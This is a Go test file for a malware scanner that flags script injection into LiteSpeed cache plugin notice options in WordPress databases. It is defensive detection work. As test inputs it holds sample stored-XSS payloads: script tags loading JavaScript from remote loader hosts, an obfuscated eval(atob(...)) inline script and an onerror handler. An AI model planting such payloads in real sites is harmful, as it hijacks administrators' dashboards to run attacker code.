package checks

import (
	"encoding/hex"
	"fmt"
	"strings"
	"testing"

	"github.com/pidginhost/csm/internal/alert"
)

// A cache plugin's own status options are rendered into the admin dashboard
// as notices. Markup there is never legitimate, so the injection is Critical
// on the option's identity alone -- no host reputation, no first-seen
// baseline. Both sinks the campaign writes to are covered.
func TestPluginNoticeInjectionReportsLiteSpeedSinks(t *testing.T) {
	for _, option := range []string{"litespeed.cdn_setup._summary", "litespeed.admin_display.messages", "litespeed.admin_display.msg_pin"} {
		value := `{"cdn_setup_err":"<script src=https:\/\/dijasa.com\/wp-includes\/js\/jquery_v2.js><\/script>"}`

		finding := pluginNoticeInjectionFinding("cbsoft", wpDBCreds{dbName: "cbsoft_wp"}, "wp_2_", option, value)

		if finding == nil {
			t.Fatalf("%s: no finding for a script tag in a plugin notice sink", option)
		}
		if finding.Check != "db_options_plugin_notice_injection" || finding.Severity != alert.Critical {
			t.Fatalf("%s: finding = %s/%s, want db_options_plugin_notice_injection/Critical", option, finding.Check, finding.Severity)
		}
		if !strings.Contains(finding.Details, "dijasa.com") {
			t.Fatalf("%s: details do not name the loader host: %s", option, finding.Details)
		}
		if !strings.Contains(finding.Message, option) {
			t.Fatalf("%s: message does not name the option: %s", option, finding.Message)
		}
	}
}

// The same sink holding the error string LiteSpeed actually writes must stay
// silent, or every site that once failed a CDN setup alerts forever.
func TestPluginNoticeInjectionIgnoresGenuineErrorText(t *testing.T) {
	value := `{"cdn_setup_err":"There was an error during CDN setup: cURL error 28: Operation timed out"}`

	if finding := pluginNoticeInjectionFinding("alice", wpDBCreds{dbName: "alice_wp"}, "wp_", "litespeed.cdn_setup._summary", value); finding != nil {
		t.Fatalf("genuine LiteSpeed error text reported: %+v", finding)
	}
}

// A script tag in a content option is ordinary: site owners paste tracking
// and widget code there. Those stay with the reputation-and-baseline path;
// this check must not claim them.
func TestPluginNoticeInjectionIgnoresContentOptions(t *testing.T) {
	value := `a:1:{i:2;a:1:{s:7:"content";s:54:"<script src="https://mny.ro/npId.js" type="text/javascript">";}}`

	if finding := pluginNoticeInjectionFinding("alice", wpDBCreds{dbName: "alice_wp"}, "wp_", "widget_block", value); finding != nil {
		t.Fatalf("content option reported as a plugin notice injection: %+v", finding)
	}
}

// WordPress option_name collation is case-insensitive, so a differently-cased
// row satisfies the same get_option() lookup and must not slip the check.
func TestPluginNoticeInjectionMatchesSinkCaseInsensitively(t *testing.T) {
	value := `{"cdn_setup_err":"<script src=https:\/\/movie88.my.id\/system4\/speed.js><\/script>"}`

	if finding := pluginNoticeInjectionFinding("alice", wpDBCreds{dbName: "alice_wp"}, "wp_", "LiteSpeed.CDN_Setup._Summary", value); finding == nil {
		t.Fatal("differently-cased sink option not reported")
	}
}

// An injection that carries no src attribute -- inline script, or a
// javascript: handler -- is the same defect in the same sink.
func TestPluginNoticeInjectionReportsInlineScriptWithoutSrc(t *testing.T) {
	value := `["<div class=\"notice notice-error\"><p>CDN Setup is running<\/p><script>eval(atob(String.fromCharCode(90,88,90,112,98,65,61,61)))<\/script><\/div>"]`

	finding := pluginNoticeInjectionFinding("alice", wpDBCreds{dbName: "alice_wp"}, "wp_", "litespeed.admin_display.messages", value)
	if finding == nil {
		t.Fatal("inline script in a notice sink not reported")
	}
	if finding.Severity != alert.Critical {
		t.Fatalf("severity = %s, want Critical", finding.Severity)
	}
}

// The options scan must query the notice sinks directly. The generic script
// query caps its result set, and a LIKE that requires a src attribute misses
// an inline payload, so the sink rows need their own bounded lookup.
func TestOptionsScanQueriesPluginNoticeSinks(t *testing.T) {
	withFreshStore(t)
	previous := runMySQLQuery
	var sinkQueried bool
	runMySQLQuery = func(_ wpDBCreds, query string) []string {
		if strings.Contains(query, "litespeed.cdn_setup._summary") {
			sinkQueried = true
			for _, want := range []string{
				"FROM wp_2_options WHERE option_name IN (",
				"OCTET_LENGTH(option_value)",
				"HEX(LEFT(CAST(option_value AS BINARY), 65536))",
				"'litespeed.admin_display.messages'",
				"'litespeed.admin_display.msg_pin'",
				"LIMIT 3",
			} {
				if !strings.Contains(query, want) {
					t.Errorf("notice query missing %q: %s", want, query)
				}
			}
			if strings.Contains(query, " LIKE ") {
				t.Errorf("notice query filters out existing non-script markers: %s", query)
			}
			return []string{pluginNoticeQueryRow("litespeed.cdn_setup._summary",
				`{"cdn_setup_err":"<script src=https:\/\/loader.example.com\/loader.js><\/script>"}`)}
		}
		return nil
	}
	t.Cleanup(func() { runMySQLQuery = previous })

	findings := checkWPOptions("alice", wpDBCreds{dbName: "alice_wp"}, "wp_2_")

	if !sinkQueried {
		t.Fatal("options scan never queried the plugin notice sinks")
	}
	var got *alert.Finding
	for i := range findings {
		if findings[i].Check == "db_options_plugin_notice_injection" {
			got = &findings[i]
		}
	}
	if got == nil {
		t.Fatalf("no db_options_plugin_notice_injection finding: %+v", findings)
	}
	if got.Severity != alert.Critical || !strings.Contains(got.Details, "loader.example.com") {
		t.Fatalf("finding = %s, details = %s", got.Severity, got.Details)
	}
}

func pluginNoticeQueryRow(option, value string) string {
	return fmt.Sprintf("%s\t%d\tx%s", option, len(value), hex.EncodeToString([]byte(value)))
}

// A notice can contain earlier messages, whitespace, or binary transport
// escapes before its script. All stored bytes must reach the matcher intact.
func TestOptionsScanPluginNoticeStoredValues(t *testing.T) {
	for name, value := range map[string]string{
		"late script":             strings.Repeat("Earlier CDN setup message. ", 40) + `<script src=https://loader.example.com/x.js></script>`,
		"script newline":          "<script\nsrc=https://loader.example.com/x.js></script>",
		"script tab":              "<script\tsrc=https://loader.example.com/x.js></script>",
		"inline":                  `<script>eval(atob(String.fromCharCode(90,88,90,112,98,65,61,61)))<\/script>`,
		"existing iframe marker":  `<iframe src=https://loader.example.com></iframe>`,
		"existing handler marker": `<img src=x onerror=alert(1)>`,
		"byte limit":              strings.Repeat("x", 65536-len("<script></script>")) + "<script></script>",
	} {
		t.Run(name, func(t *testing.T) {
			previous := runMySQLQuery
			runMySQLQuery = func(_ wpDBCreds, query string) []string {
				if strings.Contains(query, "litespeed.cdn_setup._summary") {
					return []string{pluginNoticeQueryRow("litespeed.admin_display.messages", value)}
				}
				return nil
			}
			t.Cleanup(func() { runMySQLQuery = previous })
			ctx, incomplete := withIncompleteCheckCollector(t.Context())
			got := checkWPOptions("alice", wpDBCreds{dbName: "wp", queryCtx: ctx}, "wp_")
			if len(got) != 1 || got[0].Check != "db_options_plugin_notice_injection" || got[0].Severity != alert.Critical {
				t.Fatalf("notice findings = %+v, want one Critical injection", got)
			}
			if incomplete.contains("db_content") {
				t.Fatal("complete notice value marked incomplete")
			}
		})
	}
}

func TestOptionsScanPluginNoticeIncompleteRows(t *testing.T) {
	option := "litespeed.admin_display.messages"
	payload := "<script></script>"
	for name, row := range map[string]string{
		"missing fields":       option,
		"invalid length":       option + "\tno\tx00",
		"negative length":      option + "\t-1\tx",
		"invalid hex":          option + "\t1\txZZ",
		"partial hex":          pluginNoticeQueryRow(option, payload) + "f",
		"transport truncation": fmt.Sprintf("%s\t%d\tx%x", option, len(payload)+1, payload),
		"oversize":             fmt.Sprintf("%s\t65537\tx%x", option, payload+strings.Repeat("x", 65536-len(payload))),
	} {
		t.Run(name, func(t *testing.T) {
			previous := runMySQLQuery
			runMySQLQuery = func(_ wpDBCreds, query string) []string {
				if strings.Contains(query, "litespeed.cdn_setup._summary") {
					return []string{row, pluginNoticeQueryRow("litespeed.admin_display.msg_pin", payload)}
				}
				return nil
			}
			t.Cleanup(func() { runMySQLQuery = previous })
			ctx, incomplete := withIncompleteCheckCollector(t.Context())
			got := checkWPOptions("alice", wpDBCreds{dbName: "wp", queryCtx: ctx}, "wp_")
			if len(got) != 1 || !strings.Contains(got[0].Message, "litespeed.admin_display.msg_pin") {
				t.Fatalf("want only the complete neighboring notice finding, got %+v", got)
			}
			if !incomplete.contains("db_content") {
				t.Fatal("unread notice bytes did not mark the scan incomplete")
			}
		})
	}
}

func TestOptionsScanPluginNoticeCleanRows(t *testing.T) {
	previous := runMySQLQuery
	runMySQLQuery = func(_ wpDBCreds, query string) []string {
		if strings.Contains(query, "litespeed.cdn_setup._summary") {
			return []string{
				pluginNoticeQueryRow("litespeed.cdn_setup._summary", ""),
				pluginNoticeQueryRow("litespeed.admin_display.messages", `<div class="notice notice-error"><p>CDN setup timed out</p></div>`),
				pluginNoticeQueryRow("litespeed.admin_display.msg_pin", `<scripture>inert text</scripture>`),
			}
		}
		return nil
	}
	t.Cleanup(func() { runMySQLQuery = previous })
	ctx, incomplete := withIncompleteCheckCollector(t.Context())
	if got := checkWPOptions("alice", wpDBCreds{dbName: "wp", queryCtx: ctx}, "wp_"); len(got) != 0 {
		t.Fatalf("clean notices reported: %+v", got)
	}
	if incomplete.contains("db_content") {
		t.Fatal("empty or inert notices marked incomplete")
	}
}
